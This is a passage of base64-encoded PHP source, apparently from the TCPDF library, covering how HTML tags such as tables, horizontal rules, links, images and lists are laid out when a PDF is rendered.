gQU5EICgkb24gPiAwKSkgewoJCQkJaWYgKGlzc2V0KCRwYXJlbnRbJ2ZvbnRzaXplJ10pKSB7CgkJCQkJJGhieiA9ICgoJHBhcmVudFsnZm9udHNpemUnXSAvICR0aGlzLT5rKSAqICR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbyk7CgkJCQl9IGVsc2UgewoJCQkJCSRoYnogPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQkJfQoJCQl9CgkJCWlmIChpc3NldCgkZG9tWygka2V5IC0gMSldKSBBTkQgKCRkb21bKCRrZXkgLSAxKV1bJ3ZhbHVlJ10gPT0gJ3RhYmxlJykpIHsKCQkJCS8vIGZpeCB2ZXJ0aWNhbCBzcGFjZSBhZnRlciB0YWJsZQoJCQkJJGhieiA9IDA7CgkJCX0KCQkJLy8gY2xvc2luZyB2ZXJ0aWNhbCBzcGFjZQoJCQkkaGJjID0gMDsKCQkJaWYgKGlzc2V0KCR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzFdWydoJ10pICYmICFlbXB0eSgkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXVsxXVsnaCddKSAmJiAoJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMV1bJ2gnXSA+PSAwKSkgewoJCQkJJHByZV9oID0gJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMV1bJ2gnXTsKCQkJfSBlbHNlaWYgKGlzc2V0KCRwYXJlbnRbJ2ZvbnRzaXplJ10pKSB7CgkJCQkkcHJlX2ggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkcGFyZW50Wydmb250c2l6ZSddIC8gJHRoaXMtPmspOwoJCQl9IGVsc2UgewoJCQkJJHByZV9oID0gJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMV1bJ24nXSkpIHsKCQkJCSRjbiA9ICR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzFdWyduJ107CgkJCX0gZWxzZWlmIChwcmVnX21hdGNoKCcvW2hdWzAtOV0vJywgJHRhZ1sndmFsdWUnXSkgPiAwKSB7CgkJCQkkY24gPSAwLjY7CgkJCX0gZWxzZSB7CgkJCQkkY24gPSAxOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXVsxXSkpIHsKCQkJCSRoYmMgPSAoJGNuICogJHByZV9oKTsKCQkJfQoJCX0KCQkvLyBPcGVuaW5nIHRhZwoJCXN3aXRjaCgkdGFnWyd2YWx1ZSddKSB7CgkJCWNhc2UgJ3RhYmxlJzogewoJCQkJJGNwID0gMDsKCQkJCSRjcyA9IDA7CgkJCQkkZG9tWyRrZXldWydyb3dzcGFucyddID0gYXJyYXkoKTsKCQkJCWlmICghaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ25lc3RlZCddKSBPUiAoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ25lc3RlZCddICE9ICd0cnVlJykpIHsKCQkJCQkkdGhpcy0+aHRtbHZzcGFjZSA9IDA7CgkJCQkJLy8gc2V0IHRhYmxlIGhlYWRlcgoJCQkJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGRvbVska2V5XVsndGhlYWQnXSkpIHsKCQkJCQkJLy8gc2V0IHRhYmxlIGhlYWRlcgoJCQkJCQkkdGhpcy0+dGhlYWQgPSAkZG9tWyRrZXldWyd0aGVhZCddOwoJCQkJCQlpZiAoIWlzc2V0KCR0aGlzLT50aGVhZE1hcmdpbnMpIE9SIChlbXB0eSgkdGhpcy0+dGhlYWRNYXJnaW5zKSkpIHsKCQkJCQkJCSR0aGlzLT50aGVhZE1hcmdpbnMgPSBhcnJheSgpOwoJCQkJCQkJJHRoaXMtPnRoZWFkTWFyZ2luc1snY2VsbF9wYWRkaW5nJ10gPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCQkJCQkJJHRoaXMtPnRoZWFkTWFyZ2luc1snbG1hcmdpbiddID0gJHRoaXMtPmxNYXJnaW47CgkJCQkJCQkkdGhpcy0+dGhlYWRNYXJnaW5zWydybWFyZ2luJ10gPSAkdGhpcy0+ck1hcmdpbjsKCQkJCQkJCSR0aGlzLT50aGVhZE1hcmdpbnNbJ3BhZ2UnXSA9ICR0aGlzLT5wYWdlOwoJCQkJCQkJJHRoaXMtPnRoZWFkTWFyZ2luc1snY2VsbCddID0gJGNlbGw7CgkJCQkJCQkkdGhpcy0+dGhlYWRNYXJnaW5zWydndmFycyddID0gJHRoaXMtPmdldEdyYXBoaWNWYXJzKCk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQkvLyBzdG9yZSBjdXJyZW50IG1hcmdpbnMgYW5kIHBhZ2UKCQkJCSRkb21bJGtleV1bJ29sZF9jZWxsX3BhZGRpbmcnXSA9ICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ2NlbGxwYWRkaW5nJ10pKSB7CgkJCQkJJHBhZCA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRhZ1snYXR0cmlidXRlJ11bJ2NlbGxwYWRkaW5nJ10sIDEsICdweCcpOwoJCQkJCSR0aGlzLT5zZXRDZWxsUGFkZGluZygkcGFkKTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGFnWydwYWRkaW5nJ10pKSB7CgkJCQkJJHRoaXMtPmNlbGxfcGFkZGluZyA9ICR0YWdbJ3BhZGRpbmcnXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGFnWydhdHRyaWJ1dGUnXVsnY2VsbHNwYWNpbmcnXSkpIHsKCQkJCQkkY3MgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0YWdbJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddLCAxLCAncHgnKTsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGFnWydib3JkZXItc3BhY2luZyddKSkgewoJCQkJCSRjcyA9ICR0YWdbJ2JvcmRlci1zcGFjaW5nJ11bJ1YnXTsKCQkJCX0KCQkJCSRwcmV2X3kgPSAkdGhpcy0+eTsKCQkJCWlmICgkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoKCgyICogJGNwKSArICgyICogJGNzKSArICR0aGlzLT5sYXN0aCksICcnLCBmYWxzZSkgT1IgKCR0aGlzLT55IDwgJHByZXZfeSkpIHsKCQkJCQkkdGhpcy0+aW50aGVhZCA9IHRydWU7CgkJCQkJLy8gYWRkIGEgcGFnZSAob3IgdHJpZyBBY2NlcHRQYWdlQnJlYWsoKSBmb3IgbXVsdGljb2x1bW4gbW9kZSkKCQkJCQkkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgKyAxKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3RyJzogewoJCQkJLy8gYXJyYXkgb2YgY29sdW1ucyBwb3NpdGlvbnMKCQkJCSRkb21bJGtleV1bJ2NlbGxwb3MnXSA9IGFycmF5KCk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdocic6IHsKCQkJCWlmICgoaXNzZXQoJHRhZ1snaGVpZ2h0J10pKSBBTkQgKCR0YWdbJ2hlaWdodCddICE9ICcnKSkgewoJCQkJCSRockhlaWdodCA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHRhZ1snaGVpZ2h0J10sIDEsICdweCcpOwoJCQkJfSBlbHNlIHsKCQkJCQkkaHJIZWlnaHQgPSAkdGhpcy0+R2V0TGluZVdpZHRoKCk7CgkJCQl9CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgkaGJ6LCBtYXgoJGhiLCAoJGhySGVpZ2h0IC8gMikpLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCSR4ID0gJHRoaXMtPkdldFgoKTsKCQkJCSR5ID0gJHRoaXMtPkdldFkoKTsKCQkJCSR3dG1wID0gJHRoaXMtPncgLSAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luOwoJCQkJaWYgKCRjZWxsKSB7CgkJCQkJJHd0bXAgLT0gKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSArICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXSk7CgkJCQl9CgkJCQlpZiAoKGlzc2V0KCR0YWdbJ3dpZHRoJ10pKSBBTkQgKCR0YWdbJ3dpZHRoJ10gIT0gJycpKSB7CgkJCQkJJGhyV2lkdGggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0YWdbJ3dpZHRoJ10sICR3dG1wLCAncHgnKTsKCQkJCX0gZWxzZSB7CgkJCQkJJGhyV2lkdGggPSAkd3RtcDsKCQkJCX0KCQkJCSRwcmV2bGluZXdpZHRoID0gJHRoaXMtPkdldExpbmVXaWR0aCgpOwoJCQkJJHRoaXMtPnNldExpbmVXaWR0aCgkaHJIZWlnaHQpOwoKCQkJCSRsaW5lU3R5bGUgPSBhcnJheSgpOwoJCQkJaWYgKGlzc2V0KCR0YWdbJ2ZnY29sb3InXSkpIHsKCQkJCQkkbGluZVN0eWxlWydjb2xvciddID0gJHRhZ1snZmdjb2xvciddOwoJCQkJfQoKCQkJCWlmIChpc3NldCgkdGFnWydmZ2NvbG9yJ10pKSB7CgkJCQkJJGxpbmVTdHlsZVsnY29sb3InXSA9ICR0YWdbJ2ZnY29sb3InXTsKCQkJCX0KCgkJCQlpZiAoaXNzZXQoJHRhZ1snc3R5bGUnXVsnY2FwJ10pKSB7CgkJCQkJJGxpbmVTdHlsZVsnY2FwJ10gPSAkdGFnWydzdHlsZSddWydjYXAnXTsKCQkJCX0KCgkJCQlpZiAoaXNzZXQoJHRhZ1snc3R5bGUnXVsnam9pbiddKSkgewoJCQkJCSRsaW5lU3R5bGVbJ2pvaW4nXSA9ICR0YWdbJ3N0eWxlJ11bJ2pvaW4nXTsKCQkJCX0KCgkJCQlpZiAoaXNzZXQoJHRhZ1snc3R5bGUnXVsnZGFzaCddKSkgewoJCQkJCSRsaW5lU3R5bGVbJ2Rhc2gnXSA9ICR0YWdbJ3N0eWxlJ11bJ2Rhc2gnXTsKCQkJCX0KCgkJCQlpZiAoaXNzZXQoJHRhZ1snc3R5bGUnXVsncGhhc2UnXSkpIHsKCQkJCQkkbGluZVN0eWxlWydwaGFzZSddID0gJHRhZ1snc3R5bGUnXVsncGhhc2UnXTsKCQkJCX0KCgkJCQkkbGluZVN0eWxlID0gYXJyYXlfZmlsdGVyKCRsaW5lU3R5bGUpOwoKCQkJCSR0aGlzLT5MaW5lKCR4LCAkeSwgJHggKyAkaHJXaWR0aCwgJHksICRsaW5lU3R5bGUpOwoJCQkJJHRoaXMtPnNldExpbmVXaWR0aCgkcHJldmxpbmV3aWR0aCk7CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZShtYXgoJGhiYywgKCRockhlaWdodCAvIDIpKSwgMCwgJGNlbGwsICFpc3NldCgkZG9tWygka2V5ICsgMSldKSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdhJzogewoJCQkJaWYgKGFycmF5X2tleV9leGlzdHMoJ2hyZWYnLCAkdGFnWydhdHRyaWJ1dGUnXSkpIHsKCQkJCQkkdGhpcy0+SFJFRlsndXJsJ10gPSAkdGFnWydhdHRyaWJ1dGUnXVsnaHJlZiddOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaW1nJzogewoJCQkJaWYgKGVtcHR5KCR0YWdbJ2F0dHJpYnV0ZSddWydzcmMnXSkpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCSRpbWdzcmMgPSAkdGFnWydhdHRyaWJ1dGUnXVsnc3JjJ107CgkJCQlpZiAoJGltZ3NyY1swXSA9PT0gJ0AnKSB7CgkJCQkJLy8gZGF0YSBzdHJlYW0KCQkJCQkkaW1nc3JjID0gJ0AnLmJhc2U2NF9kZWNvZGUoc3Vic3RyKCRpbWdzcmMsIDEpKTsKCQkJCQkkdHlwZSA9IHByZWdfbWF0Y2goJy88c3ZnXHMrW14+XSpbXj5dKj4uKjxcL3N2Zz4vaXMnLCAkaW1nc3JjKSA/ICdzdmcnIDogJyc7CgkJCQl9IGVsc2UgaWYgKHByZWdfbWF0Y2goJ0BeZGF0YTppbWFnZS8oW147XSopO2Jhc2U2NCwoLiopQCcsICRpbWdzcmMsICRyZWcpKSB7CgkJCQkJJGltZ3NyYyA9ICdAJy5iYXNlNjRfZGVjb2RlKCRyZWdbMl0pOwoJCQkJCSR0eXBlID0gJHJlZ1sxXTsKCQkJCX0gZWxzZWlmICgkdGhpcy0+aXNSZWxhdGl2ZVBhdGgoJGltZ3NyYykpIHsKCQkJCQkvLyBhY2Nlc3NpbmcgcGFyZW50IGZvbGRlcnMgaXMgbm90IGFsbG93ZWQKCQkJCQlicmVhazsKCQkJCX0gZWxzZWlmICggJHRoaXMtPmFsbG93TG9jYWxGaWxlcyAmJiBzdWJzdHIoJGltZ3NyYywgMCwgNykgPT09ICdmaWxlOi8vJykgewoJCQkJCS8vIGdldCBpbWFnZSB0eXBlIGZyb20gYSBsb2NhbCBmaWxlIHBhdGgKCQkJCQkkaW1nc3JjID0gc3Vic3RyKCRpbWdzcmMsIDcpOwoJCQkJCSR0eXBlID0gVENQREZfSU1BR0VTOjpnZXRJbWFnZUZpbGVUeXBlKCRpbWdzcmMpOwoJCQkJfSBlbHNlaWYgKCR0aGlzLT5oYXNFeHRGb3JiaWRkZW5Qcm90b2NvbCgkaW1nc3JjKSkgewoJCQkJCWJyZWFrOwoJCQkJfSBlbHNlIHsKCQkJCQlpZiAoKCRpbWdzcmNbMF0gPT09ICcvJykgQU5EICFlbXB0eSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSBBTkQgKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gIT0gJy8nKSkgewoJCQkJCQkvLyBmaXggaW1hZ2UgcGF0aAoJCQkJCQkkZmluZHJvb3QgPSBzdHJwb3MoJGltZ3NyYywgJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CgkJCQkJCWlmICgoJGZpbmRyb290ID09PSBmYWxzZSkgT1IgKCRmaW5kcm9vdCA+IDEpKSB7CgkJCQkJCQlpZiAoc3Vic3RyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sIC0xKSA9PSAnLycpIHsKCQkJCQkJCQkkaW1nc3JjID0gc3Vic3RyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sIDAsIC0xKS4kaW1nc3JjOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkaW1nc3JjID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4kaW1nc3JjOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCSRpbWdzcmMgPSB1cmxkZWNvZGUoJGltZ3NyYyk7CgkJCQkJCSR0ZXN0c2NydHlwZSA9IEBwYXJzZV91cmwoJGltZ3NyYyk7CgkJCQkJCWlmIChlbXB0eSgkdGVzdHNjcnR5cGVbJ3F1ZXJ5J10pKSB7CgkJCQkJCQkvLyBjb252ZXJ0IFVSTCB0byBzZXJ2ZXIgcGF0aAoJCQkJCQkJJGltZ3NyYyA9IHN0cl9yZXBsYWNlKEtfUEFUSF9VUkwsIEtfUEFUSF9NQUlOLCAkaW1nc3JjKTsKCQkJCQkJfSBlbHNlaWYgKHByZWdfbWF0Y2goJ3xeaHR0cHM/Oi8vfCcsICRpbWdzcmMpICE9PSAxKSB7CgkJCQkJCQkvLyBjb252ZXJ0IFVSTCB0byBzZXJ2ZXIgcGF0aAoJCQkJCQkJJGltZ3NyYyA9IHN0cl9yZXBsYWNlKEtfUEFUSF9NQUlOLCBLX1BBVEhfVVJMLCAkaW1nc3JjKTsKCQkJCQkJfQoJCQkJCX0KCQkJCQkvLyBnZXQgaW1hZ2UgdHlwZQoJCQkJCSR0eXBlID0gVENQREZfSU1BR0VTOjpnZXRJbWFnZUZpbGVUeXBlKCRpbWdzcmMpOwoJCQkJfQoJCQkJaWYgKCFpc3NldCgkdGFnWyd3aWR0aCddKSkgewoJCQkJCSR0YWdbJ3dpZHRoJ10gPSAwOwoJCQkJfQoJCQkJaWYgKCFpc3NldCgkdGFnWydoZWlnaHQnXSkpIHsKCQkJCQkkdGFnWydoZWlnaHQnXSA9IDA7CgkJCQl9CgkJCQkvL2lmICghaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ2FsaWduJ10pKSB7CgkJCQkJLy8gdGhlIG9ubHkgYWxpZ25tZW50IHN1cHBvcnRlZCBpcyAiYm90dG9tIgoJCQkJCS8vIGZ1cnRoZXIgZGV2ZWxvcG1lbnQgaXMgcmVxdWlyZWQgZm9yIG90aGVyIG1vZGVzLgoJCQkJCSR0YWdbJ2F0dHJpYnV0ZSddWydhbGlnbiddID0gJ2JvdHRvbSc7CgkJCQkvL30KCQkJCXN3aXRjaCgkdGFnWydhdHRyaWJ1dGUnXVsnYWxpZ24nXSkgewoJCQkJCWNhc2UgJ3RvcCc6IHsKCQkJCQkJJGFsaWduID0gJ1QnOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAnbWlkZGxlJzogewoJCQkJCQkkYWxpZ24gPSAnTSc7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdib3R0b20nOiB7CgkJCQkJCSRhbGlnbiA9ICdCJzsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWRlZmF1bHQ6IHsKCQkJCQkJJGFsaWduID0gJ0InOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQl9CgkJCQkkcHJldnkgPSAkdGhpcy0+eTsKCQkJCSR4cG9zID0gJHRoaXMtPng7CgkJCQkkaW1nbGluayA9ICcnOwoJCQkJaWYgKGlzc2V0KCR0aGlzLT5IUkVGWyd1cmwnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+SFJFRlsndXJsJ10pKSB7CgkJCQkJJGltZ2xpbmsgPSAkdGhpcy0+SFJFRlsndXJsJ107CgkJCQkJaWYgKCRpbWdsaW5rWzBdID09ICcjJyBBTkQgaXNfbnVtZXJpYygkaW1nbGlua1sxXSkpIHsKCQkJCQkJLy8gY29udmVydCB1cmwgdG8gaW50ZXJuYWwgbGluawoJCQkJCQkkbG5rZGF0YSA9IGV4cGxvZGUoJywnLCAkaW1nbGluayk7CgkJCQkJCWlmIChpc3NldCgkbG5rZGF0YVswXSkpIHsKCQkJCQkJCSRwYWdlID0gaW50dmFsKHN1YnN0cigkbG5rZGF0YVswXSwgMSkpOwoJCQkJCQkJaWYgKGVtcHR5KCRwYWdlKSBPUiAoJHBhZ2UgPD0gMCkpIHsKCQkJCQkJCQkkcGFnZSA9ICR0aGlzLT5wYWdlOwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRsbmtkYXRhWzFdKSBBTkQgKHN0cmxlbigkbG5rZGF0YVsxXSkgPiAwKSkgewoJCQkJCQkJCSRsbmt5ID0gZmxvYXR2YWwoJGxua2RhdGFbMV0pOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkbG5reSA9IDA7CgkJCQkJCQl9CgkJCQkJCQkkaW1nbGluayA9ICR0aGlzLT5BZGRMaW5rKCk7CgkJCQkJCQkkdGhpcy0+c2V0TGluaygkaW1nbGluaywgJGxua3ksICRwYWdlKTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJCSRib3JkZXIgPSAwOwoJCQkJaWYgKGlzc2V0KCR0YWdbJ2JvcmRlciddKSBBTkQgIWVtcHR5KCR0YWdbJ2JvcmRlciddKSkgewoJCQkJCS8vIGN1cnJlbnRseSBvbmx5IHN1cHBvcnQgMSAoZnJhbWUpIG9yIGEgY29tYmluYXRpb24gb2YgJ0xUUkInCgkJCQkJJGJvcmRlciA9ICR0YWdbJ2JvcmRlciddOwoJCQkJfQoJCQkJJGl3ID0gJyc7CgkJCQlpZiAoaXNzZXQoJHRhZ1snd2lkdGgnXSkpIHsKCQkJCQkkaXcgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0YWdbJ3dpZHRoJ10sICgkdGFnWydmb250c2l6ZSddIC8gJHRoaXMtPmspLCAncHgnLCBmYWxzZSk7CgkJCQl9CgkJCQkkaWggPSAnJzsKCQkJCWlmIChpc3NldCgkdGFnWydoZWlnaHQnXSkpIHsKCQkJCQkkaWggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0YWdbJ2hlaWdodCddLCAoJHRhZ1snZm9udHNpemUnXSAvICR0aGlzLT5rKSwgJ3B4JywgZmFsc2UpOwoJCQkJfQoJCQkJaWYgKCgkdHlwZSA9PSAnZXBzJykgT1IgKCR0eXBlID09ICdhaScpKSB7CgkJCQkJJHRoaXMtPkltYWdlRXBzKCRpbWdzcmMsICR4cG9zLCAkdGhpcy0+eSwgJGl3LCAkaWgsICRpbWdsaW5rLCB0cnVlLCAkYWxpZ24sICcnLCAkYm9yZGVyLCB0cnVlKTsKCQkJCX0gZWxzZWlmICgkdHlwZSA9PSAnc3ZnJykgewoJCQkJCSR0aGlzLT5JbWFnZVNWRygkaW1nc3JjLCAkeHBvcywgJHRoaXMtPnksICRpdywgJGloLCAkaW1nbGluaywgJGFsaWduLCAnJywgJGJvcmRlciwgdHJ1ZSk7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5JbWFnZSgkaW1nc3JjLCAkeHBvcywgJHRoaXMtPnksICRpdywgJGloLCAnJywgJGltZ2xpbmssICRhbGlnbiwgZmFsc2UsIDMwMCwgJycsIGZhbHNlLCBmYWxzZSwgJGJvcmRlciwgZmFsc2UsIGZhbHNlLCB0cnVlKTsKCQkJCX0KCQkJCXN3aXRjaCgkYWxpZ24pIHsKCQkJCQljYXNlICdUJzogewoJCQkJCQkkdGhpcy0+eSA9ICRwcmV2eTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ00nOiB7CgkJCQkJCSR0aGlzLT55ID0gKCgkdGhpcy0+aW1nX3JiX3kgKyAkcHJldnkgLSAoJHRoaXMtPmdldENlbGxIZWlnaHQoJHRhZ1snZm9udHNpemUnXSAvICR0aGlzLT5rKSkpIC8gMik7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdCJzogewoJCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT5pbWdfcmJfeSAtICgkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGFnWydmb250c2l6ZSddIC8gJHRoaXMtPmspIC0gKCR0aGlzLT5nZXRGb250RGVzY2VudCgkdGFnWydmb250bmFtZSddLCAkdGFnWydmb250c3R5bGUnXSwgJHRhZ1snZm9udHNpemUnXSkgKiAkdGhpcy0+Y2VsbF9oZWlnaHRfcmF0aW8pKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnZGwnOiB7CgkJCQkrKyR0aGlzLT5saXN0bnVtOwoJCQkJaWYgKCR0aGlzLT5saXN0bnVtID09IDEpIHsKCQkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgkaGJ6LCAkaGIsICRjZWxsLCAkZmlyc3R0YWcpOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgwLCAwLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2R0JzogewoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2RkJzogewoJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkkdGhpcy0+ck1hcmdpbiArPSAkdGhpcy0+bGlzdGluZGVudDsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPmxNYXJnaW4gKz0gJHRoaXMtPmxpc3RpbmRlbnQ7CgkJCQl9CgkJCQkrKyR0aGlzLT5saXN0aW5kZW50bGV2ZWw7CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgkaGJ6LCAkaGIsICRjZWxsLCAkZmlyc3R0YWcpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAndWwnOgoJCQljYXNlICdvbCc6IHsKCQkJCSsrJHRoaXMtPmxpc3RudW07CgkJCQlpZiAoJHRhZ1sndmFsdWUnXSA9PSAnb2wnKSB7CgkJCQkJJHRoaXMtPmxpc3RvcmRlcmVkWyR0aGlzLT5saXN0bnVtXSA9IHRydWU7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5saXN0b3JkZXJlZFskdGhpcy0+bGlzdG51bV0gPSBmYWxzZTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGFnWydhdHRyaWJ1dGUnXVsnc3RhcnQnXSkpIHsKCQkJCQkkdGhpcy0+bGlzdGNvdW50WyR0aGlzLT5saXN0bnVtXSA9IGludHZhbCgkdGFnWydhdHRyaWJ1dGUnXVsnc3RhcnQnXSkgLSAxOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+bGlzdGNvdW50WyR0aGlzLT5saXN0bnVtXSA9IDA7CgkJCQl9CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT5yTWFyZ2luICs9ICR0aGlzLT5saXN0aW5kZW50OwoJCQkJCSR0aGlzLT54IC09ICR0aGlzLT5saXN0aW5kZW50OwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+bE1hcmdpbiArPSAkdGhpcy0+bGlzdGluZGVudDsKCQkJCQkkdGhpcy0+eCArPSAkdGhpcy0+bGlzdGluZGVudDsKCQkJCX0KCQkJCSsrJHRoaXMtPmxpc3RpbmRlbnRsZXZlbDsKCQkJCWlmICgkdGhpcy0+bGlzdG51bSA9PSAxKSB7CgkJCQkJaWYgKCRrZXkgPiAxKSB7CgkJCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsICRmaXJzdHRhZyk7CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgwLCAwLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2xpJzogewoJCQkJaWYgKCRrZXkgPiAyKSB7CgkJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCX0KCQkJCWlmICgkdGhpcy0+bGlzdG9yZGVyZWRbJHRoaXMtPmxpc3RudW1dKSB7CgkJCQkJLy8gb3JkZXJlZCBpdGVtCgkJCQkJaWYgKGlzc2V0KCRwYXJlbnRbJ2F0dHJpYnV0ZSddWyd0eXBlJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHBhcmVudFsnYXR0cmlidXRlJ11bJ3R5cGUnXSkpIHsKCQkJCQkJJHRoaXMtPmxpc3BhY2VyID0gJHBhcmVudFsnYXR0cmlidXRlJ11bJ3R5cGUnXTsKCQkJCQl9IGVsc2VpZiAoaXNzZXQoJHBhcmVudFsnbGlzdHR5cGUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFyZW50WydsaXN0dHlwZSddKSkgewoJCQkJCQkkdGhpcy0+bGlzcGFjZXIgPSAkcGFyZW50WydsaXN0dHlwZSddOwoJCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+bGlzeW1ib2wpIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmxpc3ltYm9sKSkgewoJCQkJCQkkdGhpcy0+bGlzcGFjZXIgPSAkdGhpcy0+bGlzeW1ib2w7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRoaXMtPmxpc3BhY2VyID0gJyMnOwoJCQkJCX0KCQkJCQkrKyR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dOwoJCQkJCWlmIChpc3NldCgkdGFnWydhdHRyaWJ1dGUnXVsndmFsdWUnXSkpIHsKCQkJCQkJJHRoaXMtPmxpc3Rjb3VudFskdGhpcy0+bGlzdG51bV0gPSBpbnR2YWwoJHRhZ1snYXR0cmlidXRlJ11bJ3ZhbHVlJ10pOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJLy8gdW5vcmRlcmVkIGl0ZW0KCQkJCQlpZiAoaXNzZXQoJHBhcmVudFsnYXR0cmlidXRlJ11bJ3R5cGUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFyZW50WydhdHRyaWJ1dGUnXVsndHlwZSddKSkgewoJCQkJCQkkdGhpcy0+bGlzcGFjZXIgPSAkcGFyZW50WydhdHRyaWJ1dGUnXVsndHlwZSddOwoJCQkJCX0gZWxzZW